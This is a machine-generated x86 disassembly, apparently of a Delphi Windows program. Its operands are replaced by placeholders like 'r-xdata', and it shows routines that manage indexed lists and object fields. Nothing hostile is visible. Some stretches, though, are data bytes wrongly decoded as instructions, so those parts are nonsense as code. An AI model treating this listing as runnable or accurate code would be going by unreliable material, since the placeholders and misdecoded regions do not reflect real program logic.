call sub_477980
mov [ esi + 0x10 ] eax
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_477cc4
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ esi + 0x10 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx - 0x4 ]
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_477cf4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_477d5f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_417fbc
mov esi eax
test esi esi
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477d66
lea eax [ ebp - 0x8 ]
call sub_404074
retn
push 0x0
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_418d0c
mov eax [ ebp - 0x8 ]
push eax
mov eax ebx
call sub_417fbc
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x64 ]
dec esi
test esi esi
jg r-xdata
sub_477d80
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
xchg edx eax
call sub_419844
mov edx [ ebx + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_419960
xor eax eax
pop ebx
pop ebp
retn
sub_477da8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov edx sub_477d70
mov eax [ ebx + 0x10 ]
call sub_477a88
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_419844
mov edx sub_477d80
mov eax [ ebx + 0x10 ]
call sub_477a88
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_477e11
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_477a94
mov ebx eax
test ebx ebx
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_4040c8
mov eax esi
call sub_404074
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_477e4c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_477a94
test eax eax
jne r-xdata
mov eax [ eax ]
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_477e6c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov ebp edx
mov ebx eax
mov edx ebp
mov eax [ ebx + 0x10 ]
call sub_477a94
mov esi eax
test esi esi
jne r-xdata
mov edi [ esi ]
xor edi edi
jmp r-xdata
mov edx edi
mov eax [ esp ]
call sub_477498
mov ecx eax
mov edx ebp
mov eax [ ebx + 0x10 ]
call sub_477bf8
test edi edi
jne r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov eax ebx
call sub_477f14
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4774c4
xor ecx ecx
mov edx ebp
mov eax [ ebx + 0x10 ]
call sub_477bf8
jmp r-xdata
test esi esi
je r-xdata
sub_477ed4
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_477a94
test eax eax
je r-xdata
test esi esi
je r-xdata
mov [ eax ] esi
jmp r-xdata
mov eax ebx
call sub_477f14
pop edi
pop esi
pop ebx
retn
mov edx esi
xor eax eax
call sub_477498
mov ecx eax
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_477bf8
sub_477f28
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_477a94
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_477a00
mov eax ebx
call sub_477f14
pop esi
pop ebx
retn
call sub_4774c4
sub_477f64
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor edx edx
mov eax edi
call sub_477498
mov ecx eax
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_477b00
mov eax ebx
call sub_477f14
pop edi
pop esi
pop ebx
retn
sub_477fc0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403270
mov [ edi + 0x10 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x14 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_478008
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4780f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_414bf4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4780f7
lea eax [ ebp - 0xc ]
call sub_404074
retn
mov eax [ ebp - 0x4 ]
call sub_414c8c
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jl r-xdata
xor eax eax
push ebp
push sub_4780c9
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_414d48
retn
inc ebx
mov [ ebp - 0x8 ] ebx
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x24 ]
inc ebx
dec [ ebp - 0x8 ]
jne r-xdata
sub_478100
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jne r-xdata
test ebx ebx
jle r-xdata
mov [ ecx ] 0xffffffff
mov [ edx ] 0xffffffff
jmp r-xdata
neg ebx
dec ebx
mov [ ecx ] ebx
mov eax [ ebp - 0x4 ]
mov [ edx ] eax
mov esi [ ebp - 0x4 ]
mov [ ecx ] esi
dec ebx
mov [ edx ] ebx
jmp r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_478140
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4781ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
or ebx 0xffffffff
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
jmp r-xdata
mov ecx r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4781d1
lea eax [ ebp - 0xc ]
call sub_404074
retn
sub_4781df
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx ebx
mov esi [ eax ]
call [ esi + 0x24 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx ebx
mov ebx [ eax ]
call [ ebx + 0x20 ]
xor eax eax
pop esi
pop ebx
pop ebp
retn
sub_478214
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jle r-xdata
test ebx ebx
jge r-xdata
mov edx ebx
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x2d8 ]
call sub_477a94
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx r-xdata
mov eax [ eax + 0x10 ]
call sub_477a88
jmp r-xdata
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x24 ]
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_478288
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_4782c6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov eax [ ebp - 0x4 ]
call sub_470e64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4782cd
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_4782d0
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_478100
cmp [ esp ] 0x0
jge r-xdata
push esi
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_4788e4
mov eax esi
call sub_404074
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
sub_478310
mov edx [ eax + 0x14 ]
test edx edx
jne r-xdata
test edx edx
jle r-xdata
xor eax eax
retn
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x24c ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x21c ]
jmp r-xdata
retn
sub_478334
push ebx
add esp 0xfffffff8
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_478100
cmp [ esp ] 0x0
jge r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax [ ebx + 0x10 ]
call sub_478928
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebx
retn
sub_478368
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_4783a7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov eax [ ebp - 0x4 ]
call sub_470e64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4783ae
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_4783b4
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_478100
push esi
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_478954
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4783e4
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_478100
push esi
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_4789a4
pop ecx
pop edx
pop esi
pop ebx
retn
sub_478420
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_471ca8
mov eax esi
call sub_478734
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_478468
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
cmp [ esi + 0x2dc ] 0x0
je r-xdata
cmp [ esi + 0x2e0 ] 0x0
je r-xdata
mov edx sub_47845c
mov eax [ esi + 0x2dc ]
call sub_477a88
mov eax [ esi + 0x2dc ]
call sub_4032a0
cmp [ esi + 0x2d8 ] 0x0
je r-xdata
mov edx sub_47845c
mov eax [ esi + 0x2e0 ]
call sub_477a88
mov eax [ esi + 0x2e0 ]
call sub_4032a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_471df8
test bl bl
jle r-xdata
mov edx sub_47845c
mov eax [ esi + 0x2d8 ]
call sub_477a88
mov eax [ esi + 0x2d8 ]
call sub_4032a0
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_4784fc
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x70 ]
xor eax eax
pop esi
pop ebx
pop ebp
retn
sub_47851c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edx sub_4784fc
mov eax [ ebx + 0x2d8 ]
call sub_477a88
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_477298
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_478554
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x2d8 ]
call sub_477ba4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_477338
pop edi
pop esi
pop ebx
retn
sub_478584
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4788e4
cmp [ ebx + 0x2b2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_4785c8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_478677
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_478724
xor eax eax
push ebp
push sub_478648
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4788e4
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
call sub_404480
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47864f
mov eax [ ebp - 0x4 ]
call sub_47872c
retn
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_478954
sub_47864f
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_477388
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47867e
lea eax [ ebp - 0x10 ]
call sub_404074
retn
sub_478688
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_478714
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x28c ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4773b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47871b
lea eax [ ebp - 0x14 ]
call sub_404074
retn
mov eax [ ebp - 0xc ]
add eax 0x2
push eax
lea eax [ ebp - 0x14 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4788e4
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x10 ]
add ecx 0x2
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x208 ]
call sub_41e23c
sub_478734
push ebx
push esi
mov esi eax
cmp [ esi + 0x2e0 ] 0x0
jne r-xdata
cmp [ esi + 0x24c ] 0x100
jle r-xdata
cmp [ esi + 0x21c ] 0x200
jle r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
cmp [ esi + 0x2d8 ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_477980
mov [ esi + 0x2dc ] eax
cmp [ esi + 0x2dc ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_477980
mov [ esi + 0x2e0 ] eax
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_477980
mov [ esi + 0x2d8 ] eax
sub_4787e0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x2e4 ] 0x0
jne r-xdata
mov [ ebx + 0x2e5 ] 0x1
mov ecx edi
mov edx esi
mov eax ebx
call sub_474288
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ ebx + 0x22c ]
jne r-xdata
cmp esi [ ebx + 0x228 ]
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
jne r-xdata
mov eax ebx
call sub_472288
sub_47882c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
cmp [ esp ] 0x0
je r-xdata
lea edi [ esi + 0x2dc ]
lea edi [ esi + 0x2e0 ]
jmp r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esp ] 0x0
je r-xdata
mov eax [ edi ]
mov edx ebp
call sub_477a94
mov ebx eax
test ebx ebx
jne r-xdata
lea eax [ ebp + 0x1 ]
mov eax ebp
neg eax
dec eax
jmp r-xdata
push eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_477fc0
mov ebx eax
mov eax [ edi ]
mov ecx ebx
mov edx ebp
call sub_477bf8
sub_478890
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax [ ebx + 0x2d8 ]
call sub_477a94
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x21c ] 0x200
jle r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_477c70
mov esi eax
mov ecx esi
mov edx edi
mov eax [ ebx + 0x2d8 ]
call sub_477bf8
sub_4788e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x2d8 ]
call sub_477a94
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax esi
call sub_404074
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_478928
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x2d8 ]
call sub_477a94
test eax eax
jne r-xdata
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_478954
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_478890
mov ecx [ ebp + 0x8 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx esi
mov eax ebx
call sub_47882c
xor ecx ecx
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_47882c
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4787e0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4789a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_478890
mov ecx [ ebp + 0x8 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
mov cl 0x1
mov edx esi
mov eax ebx
call sub_47882c
xor ecx ecx
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_47882c
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4787e0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4789f4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_478a19
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478a20
retn
sub_478dc4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
mov es [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0x8e
cwde
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f000f ] al
outsb
push ebx
je r-xdata
inc edi
add [ eax ] bl
inc ebp
inc ecx
add [ esp + 0x41 ] bl
add [ esp + eax * 2 ] dh
inc ecx
add [ 0xffffffffa4000041 ] dh
inc ecx
add [ ebp + 0x41 ] al
add [ esi ] bh
inc ecx
add [ eax + ebp * 4 + 0x41 ] ch
add [ ebp + 0x41 ] dl
add [ ebp + 0x41 ] cl
add [ eax + ebp * 4 + 0x41 ] dh
add ah bh
nop
inc edi
add [ esp + edx * 2 ] cl
dec ebp
jne r-xdata
test al 0x41
inc edi
add [ eax ] al
add [ eax ] al
mov al 0x26
inc ecx
add [ eax + ebp * 4 + 0x41 ] dl
add ah dh
xor al 0x40
add [ eax - 0x3ffbe5f ] ch
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
je r-xdata
imul ebp [ esi + 0x67 ] 0x6e616843
mov eax eax
or al 0x8e
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x72 ] dl
inc edi
add [ eax ] al
add [ eax ] al
clc
jmp [ edi + ecx * 4 + 0x5 ]
je r-xdata
cmpsd [ esi ] [ edi ]
inc ebx
popad
jae r-xdata
pop esi
pop ebx
retn
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 4 ] bh
inc eax
add [ eax - 0x72 ] dl
inc edi
add [ edi ] al
or al 0x54
dec ebp
jne r-xdata
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
je r-xdata
cmp [ eax + 0x32 ] 0x0
inc ebx
popad
jae r-xdata
jb r-xdata
jo r-xdata
mov es [ edi ]
lodsb [ esi ]
daa
inc ecx
add [ edx ] al
add [ eax ] cl
inc ecx
jo r-xdata
add [ eax ] al
add [ eax ] al
jbe r-xdata
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
inc ebp
fmul [ ebx + 0x53ff3c43 ]
cmp [ ebx - 0x3d ] bl
mov eax eax
je r-xdata
pop ebx
retn
add [ eax ] al
nop
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a0e4
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
test bl bl
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4790d8
mov eax esi
add esp 0xc
call sub_40361c
pop [ fs : 0x0 ]
sub_478f10
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax esi
mov edx [ rw-data ]
call sub_40342c
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov ecx esi
mov edx edi
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_478f40
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
xor eax eax
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_478f60
push ebp
mov ebp esp
push ecx
push ebx
push esi
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4376c8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_478fca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
call sub_44a8f8
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_40349c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4032a0
retn
mov ebx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
jmp r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47904c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_479074
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x9a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
sub_4790d8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_424824
inc eax
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4247bc
sub_4790fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ rw-data ]
xor edx edx
mov eax ebx
call sub_41a0e4
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42461c
mov [ ebx + 0x30 ] eax
mov eax [ esi ]
mov [ eax + 0xc4 ] ebx
mov [ eax + 0xc0 ] sub_4793b0
mov eax [ esi ]
mov [ eax + 0xcc ] ebx
mov [ eax + 0xc8 ] sub_47942c
mov eax [ esi ]
mov [ eax + 0x114 ] ebx
mov [ eax + 0x110 ] sub_4794a8
mov eax [ esi ]
mov [ eax + 0x10c ] ebx
mov [ eax + 0x108 ] sub_47951c
mov eax [ esi ]
mov [ eax + 0xd4 ] ebx
mov [ eax + 0xd0 ] sub_479590
mov eax [ esi ]
mov [ eax + 0xf4 ] ebx
mov [ eax + 0xf0 ] sub_47964c
mov eax [ esi ]
mov [ eax + 0xfc ] ebx
mov [ eax + 0xf8 ] sub_4796e8
mov eax [ esi ]
mov [ eax + 0x104 ] ebx
mov [ eax + 0x100 ] sub_47975c
mov eax [ esi ]
